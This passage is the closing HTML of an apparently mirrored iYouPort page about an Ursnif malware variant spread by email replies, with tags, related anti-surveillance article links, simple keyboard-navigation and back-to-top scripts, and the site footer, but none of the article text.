+            <li class="share-facebook"><a class="share-facebook sd-button share-icon no-text" data-shared="sharing-facebook-7777" href="https://www.iyouport.org/%e6%b8%94%e8%89%ba%e6%ad%a3%e5%9c%a8%e5%8d%87%e7%ba%a7%ef%bc%9aursnif-%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6%e6%96%b0%e5%8f%98%e7%a7%8d%e9%80%9a%e8%bf%87%e5%9b%9e%e5%a4%8d%e9%82%ae%e4%bb%b6%e5%8d%b3/?share=facebook" rel="nofollow noopener noreferrer" target="_blank" title="点击以在 Facebook 上共享"> <span> </span> <span class="sharing-screen-reader-text"> 点击以在 Facebook 上共享（在新窗口中打开） </span> </a></li>
+            <li class="share-end"></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" data-name="like-post-frame-161182987-7777-5f402e2e58593" data-src="https://widgets.wp.com/likes/#blog_id=161182987&amp;post_id=7777&amp;origin=www.iyouport.org&amp;obj_id=161182987-7777-5f402e2e58593" id="like-post-wrapper-161182987-7777-5f402e2e58593">
+      <h3 class="sd-title" id="section-1"> 赞过： </h3>
+      <div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px;">
+<span class="button"> <span> 赞 </span> </span> <span class="loading"> 正在加载…… </span>
+      </div>
+ <span class="sd-text-color"> </span> <a class="sd-link-color">
+   </a>
+    </div>
+    <div class="jp-relatedposts" id="jp-relatedposts">
+      <h3 class="jp-relatedposts-headline" id="section-2"> <em>
+     相关
+    </em> </h3>
+    </div>
+  </div>
+  <div class="entry-footer">
+    <ul class="post-tags light-text">
+      <li>Tagged</li>
+      <li><a href="https://www.iyouport.org/tag/phishing/" rel="tag"> phishing </a></li>
+      <li><a href="https://www.iyouport.org/tag/security/" rel="tag"> Security </a></li>
+      <li><a href="https://www.iyouport.org/tag/selfcare/" rel="tag"> selfcare </a></li>
+      <li><a href="https://www.iyouport.org/tag/technology/" rel="tag"> Technology </a></li>
+      <li><a href="https://www.iyouport.org/tag/ursnif/" rel="tag"> URSNIF </a></li>
+    </ul>
+  </div>
+  <div class="entry-author-wrapper">
+    <div class="site-posted-on">
+<strong>
+    Published
+   </strong>       <time class="entry-date published" datetime="2018-10-30T13:49:40+08:00"> 2018年10月30日 </time>
+      <time class="updated" datetime="2019-08-10T13:58:12+08:00"> 2019年8月10日 </time>
+    </div>
+  </div>
+</article>
+
+
+  </div>
+
+  <hr style="border-top:1px solid #28323C;"/>
+
+<font size=2px>
+  文章版权归原作者所有。
+</font>
+
+<div style="text-align:center"><img width="1px" src="https://i.imgur.com/RinUcXm.png" alt="二维码分享本站" style="text-align:center"/></div>
+
+  <div id="sametag">
+    <h4 style="display: inline-block;">#iYouPort 的其它文章</h4>
+    <span>--<a href="https://nodebe4.github.io/oped2/2021-07-15/%E5%BD%93%E6%B0%91%E4%B8%BB%E5%A4%B1%E8%B4%A5-%E5%B7%AB%E6%9C%AF%E8%93%AC%E5%8B%83%E5%8F%91%E5%B1%95-%E6%81%B6%E9%AD%94%E5%9B%B0%E6%89%B0%E7%9A%84%E5%9C%9F%E5%9C%B0-iYouPort/">最新</a>-</span>
+    <span>-<a href="https://nodebe4.github.io/oped2/2014-10-11/%E7%BD%91%E7%BB%9C-%E6%B0%B4%E5%86%9B-%E7%9A%84%E5%B8%83%E5%B1%80-iYouPort/">最早</a>--</span>
+    
+      <li>
+        <time>2018-10-31</time>
+        <a href="https://nodebe4.github.io/oped2/2018-10-31/%E5%A6%82%E4%BD%95%E5%BA%94%E4%BB%98%E6%94%BF%E5%BA%9C%E4%BD%BF%E7%94%A8%E9%BB%84%E8%B2%82%E9%B1%BC%E5%AF%B9%E5%85%AC%E6%B0%91%E8%BF%9B%E8%A1%8C%E7%9A%84%E5%A4%A7%E8%A7%84%E6%A8%A1%E9%97%B4%E8%B0%8D%E8%A1%8C%E4%B8%BA-%E5%8F%8D%E7%9B%91%E8%A7%86%E6%8A%80%E6%9C%AF-iYouPort/">
+          如何应付政府使用黄貂鱼对公民进行的大规模间谍行为？#反监视技术 - iYouPort
+        </a>
+      </li>
+    
+    
+      <li>
+        <time>2018-10-30</time>
+        <a href="https://nodebe4.github.io/oped2/2018-10-30/%E5%A6%82%E4%BD%95%E5%9C%A8%E4%B8%8D%E5%BF%85%E6%9A%B4%E9%9C%B2%E7%9C%9F%E5%AE%9E%E7%94%B5%E8%AF%9D%E5%8F%B7%E7%A0%81%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%BD%BF%E7%94%A8-Signal-iYouPort/">
+          🔐 如何在不必暴露真实电话号码的情况下使用 Signal - iYouPort
+        </a>
+      </li>
+    
+    
+      <li>
+        <time>2018-10-27</time>
+        <a href="https://nodebe4.github.io/oped2/2018-10-27/%E5%A3%B0%E7%A7%B0-%E7%BB%99%E4%BD%A0%E9%9A%90%E7%A7%81-%E4%BD%86%E4%B8%8D%E7%BB%99%E4%BD%A0%E8%87%AA%E7%94%B1-%E7%9C%8B-Apple-%E5%A6%82%E4%BD%95%E6%8A%8A%E7%8E%A9%E6%96%87%E5%AD%97%E6%B8%B8%E6%88%8F-iYouPort/">
+          声称“给你隐私”但不给你自由：看 Apple 如何把玩文字游戏 - iYouPort
+        </a>
+      </li>
+    
+    
+      <li>
+        <time>2018-10-24</time>
+        <a href="https://nodebe4.github.io/oped2/2018-10-24/%E5%A6%82%E6%9E%9C%E8%AD%A6%E5%AF%9F%E5%9C%A8%E4%BD%A0%E7%9A%84%E6%89%8B%E6%9C%BA%E4%B8%8A%E5%BC%BA%E5%88%B6%E5%AE%89%E8%A3%85%E7%9B%91%E8%A7%86%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E5%A6%82%E4%BD%95%E6%89%8D%E8%83%BD%E5%B0%86%E5%8D%B1%E9%99%A9%E6%9C%80%E5%B0%8F%E5%8C%96-iYouPort/">
+          如果警察在你的手机上强制安装监视应用程序，如何才能将危险最小化？ - iYouPort
+        </a>
+      </li>
+    
+  </div>
+
+
+  <hr>
+  <div class="pagination">
+    
+      <span class="prev" >
+          <a href="https://nodebe4.github.io/oped2/2018-10-27/%E7%82%BA%E4%BB%80%E9%BA%BC%E6%8C%89%E4%B8%8B%E5%81%9C%E6%AD%A2%E8%BF%BD%E8%B9%A4-%E4%BD%A0%E6%88%91%E7%9A%84%E9%97%9C%E4%BF%82%E4%BE%BF%E8%83%BD%E5%AE%A3%E5%B8%83%E7%B5%90%E6%9D%9F/">
+            前一篇：為什麼按下停止追蹤，你我的關係便能宣布結束？
+          </a>
+      </span>
+    
+    
+      <span class="next" >
+          <a href="https://nodebe4.github.io/oped2/2018-10-30/%E5%A6%82%E4%BD%95%E5%9C%A8%E4%B8%8D%E5%BF%85%E6%9A%B4%E9%9C%B2%E7%9C%9F%E5%AE%9E%E7%94%B5%E8%AF%9D%E5%8F%B7%E7%A0%81%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%BD%BF%E7%94%A8-Signal-iYouPort/">
+            後一篇：🔐 如何在不必暴露真实电话号码的情况下使用 Signal - iYouPort
+          </a>
+      </span>
+    
+
+    <script>
+    /* post pagination keyboard shortcuts */
+    document.body.onkeyup = function(e){
+      if (e.keyCode == '37') { window.location = 'https://nodebe4.github.io/oped2/2018-10-27/%E7%82%BA%E4%BB%80%E9%BA%BC%E6%8C%89%E4%B8%8B%E5%81%9C%E6%AD%A2%E8%BF%BD%E8%B9%A4-%E4%BD%A0%E6%88%91%E7%9A%84%E9%97%9C%E4%BF%82%E4%BE%BF%E8%83%BD%E5%AE%A3%E5%B8%83%E7%B5%90%E6%9D%9F/'; } // left arrow key
+      if (e.keyCode == '39') { window.location = 'https://nodebe4.github.io/oped2/2018-10-30/%E5%A6%82%E4%BD%95%E5%9C%A8%E4%B8%8D%E5%BF%85%E6%9A%B4%E9%9C%B2%E7%9C%9F%E5%AE%9E%E7%94%B5%E8%AF%9D%E5%8F%B7%E7%A0%81%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%BD%BF%E7%94%A8-Signal-iYouPort/'; } // right arrow key
+      if (e.keyCode == '45') { window.location = 'https://nodebe4.github.io/oped2/2018-10-30/%E5%A6%82%E4%BD%95%E5%9C%A8%E4%B8%8D%E5%BF%85%E6%9A%B4%E9%9C%B2%E7%9C%9F%E5%AE%9E%E7%94%B5%E8%AF%9D%E5%8F%B7%E7%A0%81%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%BD%BF%E7%94%A8-Signal-iYouPort/'; } // insert key
+      if (e.keyCode == '46') { window.location = 'https://nodebe4.github.io/oped2/2018-10-27/%E5%A3%B0%E7%A7%B0-%E7%BB%99%E4%BD%A0%E9%9A%90%E7%A7%81-%E4%BD%86%E4%B8%8D%E7%BB%99%E4%BD%A0%E8%87%AA%E7%94%B1-%E7%9C%8B-Apple-%E5%A6%82%E4%BD%95%E6%8A%8A%E7%8E%A9%E6%96%87%E5%AD%97%E6%B8%B8%E6%88%8F-iYouPort/'; } // delete key
+    };
+    </script>
+    <link rel="stylesheet" type="text/css" href="/oped2/assets/css/fab.css" />
+
+<div class="fab-wrapper">
+  <div class="fab-wheel">
+    
+    
+    
+    <a class="fab-action fab-action-1" title="上一篇(热键 &#8594;)" href="https://nodebe4.github.io/oped2/2018-10-27/%E7%82%BA%E4%BB%80%E9%BA%BC%E6%8C%89%E4%B8%8B%E5%81%9C%E6%AD%A2%E8%BF%BD%E8%B9%A4-%E4%BD%A0%E6%88%91%E7%9A%84%E9%97%9C%E4%BF%82%E4%BE%BF%E8%83%BD%E5%AE%A3%E5%B8%83%E7%B5%90%E6%9D%9F/">
+      <i>后</i>
+    </a>
+    
+    
+    <a class="fab-action fab-action-2" title="下一篇(热键 &#8592;)" href="https://nodebe4.github.io/oped2/2018-10-30/%E5%A6%82%E4%BD%95%E5%9C%A8%E4%B8%8D%E5%BF%85%E6%9A%B4%E9%9C%B2%E7%9C%9F%E5%AE%9E%E7%94%B5%E8%AF%9D%E5%8F%B7%E7%A0%81%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%BD%BF%E7%94%A8-Signal-iYouPort/">
+      <i>前</i>
+    </a>
+    
+    
+    <a class="fab-action fab-action-3" title="<iYouPort>上一篇(热键 ins)" href="https://nodebe4.github.io/oped2/2018-10-30/%E5%A6%82%E4%BD%95%E5%9C%A8%E4%B8%8D%E5%BF%85%E6%9A%B4%E9%9C%B2%E7%9C%9F%E5%AE%9E%E7%94%B5%E8%AF%9D%E5%8F%B7%E7%A0%81%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%BD%BF%E7%94%A8-Signal-iYouPort/">
+      <i>左</i>
+    </a>
+    
+    
+    <a class="fab-action fab-action-4" title="<iYouPort>下一篇(热键 del)" href="https://nodebe4.github.io/oped2/2018-10-27/%E5%A3%B0%E7%A7%B0-%E7%BB%99%E4%BD%A0%E9%9A%90%E7%A7%81-%E4%BD%86%E4%B8%8D%E7%BB%99%E4%BD%A0%E8%87%AA%E7%94%B1-%E7%9C%8B-Apple-%E5%A6%82%E4%BD%95%E6%8A%8A%E7%8E%A9%E6%96%87%E5%AD%97%E6%B8%B8%E6%88%8F-iYouPort/">
+      <i>右</i>
+    </a>
+    
+  </div>
+</div>
+
+
+  </div>
+
+
+  
+
+</article>
+
+    </div>
+
+    <div style="z-index:2;">
+<script src="/oped2/assets/js/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  cornerOffset: 20, // px
+  id: 'back-to-top',
+  backgroundColor: '#ddd',
+  textColor: 'red'
+})</script>
+</div>
+
+
+    <div class="wrapper-footer" id="footer">
+      <div class="container">
+        <footer class="footer">
+          <img width="200px" src="https://i.imgur.com/RinUcXm.png" alt="二维码分享本站"/>
+<font size=2px>二维码分享本站</font>
+
+<!-- Refer to https://codepen.io/ruandre/pen/howFi -->
+<ul class="svg-icon">
+
+  
+
+  
+
+  
+  <li><a href="mailto:beauti4@protonmail.com" class="icon-8 email" title="Email"><svg viewBox="0 0 512 512"><path d="M101.3 141.6v228.9h0.3 308.4 0.8V141.6H101.3zM375.7 167.8l-119.7 91.5 -119.6-91.5H375.7zM127.6 194.1l64.1 49.1 -64.1 64.1V194.1zM127.8 344.2l84.9-84.9 43.2 33.1 43-32.9 84.7 84.7L127.8 344.2 127.8 344.2zM384.4 307.8l-64.4-64.4 64.4-49.3V307.8z"/></svg><!--[if lt IE 9]><em>Email</em><![endif]--></a></li>
+  
+
+  
+
+  
+
+  
+  <li><a href="https://github.com/NodeBE4/oped2" class="icon-13 github" title="GitHub"><svg viewBox="0 0 512 512"><path d="M256 70.7c-102.6 0-185.9 83.2-185.9 185.9 0 82.1 53.3 151.8 127.1 176.4 9.3 1.7 12.3-4 12.3-8.9V389.4c-51.7 11.3-62.5-21.9-62.5-21.9 -8.4-21.5-20.6-27.2-20.6-27.2 -16.9-11.5 1.3-11.3 1.3-11.3 18.7 1.3 28.5 19.2 28.5 19.2 16.6 28.4 43.5 20.2 54.1 15.4 1.7-12 6.5-20.2 11.8-24.9 -41.3-4.7-84.7-20.6-84.7-91.9 0-20.3 7.3-36.9 19.2-49.9 -1.9-4.7-8.3-23.6 1.8-49.2 0 0 15.6-5 51.1 19.1 14.8-4.1 30.7-6.2 46.5-6.3 15.8 0.1 31.7 2.1 46.6 6.3 35.5-24 51.1-19.1 51.1-19.1 10.1 25.6 3.8 44.5 1.8 49.2 11.9 13 19.1 29.6 19.1 49.9 0 71.4-43.5 87.1-84.9 91.7 6.7 5.8 12.8 17.1 12.8 34.4 0 24.9 0 44.9 0 51 0 4.9 3 10.7 12.4 8.9 73.8-24.6 127-94.3 127-176.4C441.9 153.9 358.6 70.7 256 70.7z"/></svg><!--[if lt IE 9]><em>GitHub</em><![endif]--></a></li>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <li><a href="/oped2/feed.xml" class="icon-21 rss" title="RSS"><svg viewBox="0 0 512 512"><path d="M201.8 347.2c0 20.3-16.5 36.8-36.8 36.8 -20.3 0-36.8-16.5-36.8-36.8s16.5-36.8 36.8-36.8C185.3 310.4 201.8 326.8 201.8 347.2zM128.2 204.7v54.5c68.5 0.7 124 56.3 124.7 124.7h54.5C306.7 285.3 226.9 205.4 128.2 204.7zM128.2 166.6c57.9 0.3 112.3 22.9 153.2 63.9 41 41 63.7 95.5 63.9 153.5h54.5c-0.3-149.9-121.7-271.4-271.6-271.9V166.6L128.2 166.6z"/></svg><!--[if lt IE 9]><em>RSS</em><![endif]--></a></li>
+  
+
+  
+
+  
+
+  
+
+  
+
+    
+</ul>
+
+
+
+
+
+<p><span style="color:blue">内容每小时更新一次.</span> Powered by <a href="https://github.com/AWEEKJ/kiko-now">Kiko Now</a> & <a href="https://github.com/gitalk/gitalk">Gitalk</a> & <a href="https://github.com/duty-machine/news">duty-machine</a>, 站务 <a href="https://be4.herokuapp.com">NodeBE4</a>（<span style="color:red">被墙</span>）</p>
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+
+
+
+  </body>
+</html>
